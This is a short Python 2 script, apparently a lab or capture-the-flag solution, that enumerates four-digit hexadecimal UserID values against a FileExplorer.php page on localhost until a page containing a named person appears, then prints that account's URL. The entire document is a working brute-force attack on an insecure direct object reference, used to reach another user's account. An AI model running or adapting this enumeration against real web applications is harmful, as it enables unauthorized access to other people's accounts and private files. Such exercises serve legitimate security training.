import urllib2

# IP of the server the page is being run on:
IP = "localhost"

# Repeat for every header of a hexadecimal value up to the new account number given
for i in range(28864):
    # Make header a 4-digit string
    header = str(hex(i))[2:]
    header = (4 - len(header)) * "0" + header
    # Open page with the UserID header and get the contents
    response = urllib2.urlopen("http://" + IP + "/FileExplorer.php?UserID=" + header)
    html = response.read()
    #print header
    # If the Name being looked for is in the page, then give the URL required for it and stop
    if html.find("Keri Benton") != -1:
        print "http://" + IP + "/FileExplorer.php?UserID=" + header
        break
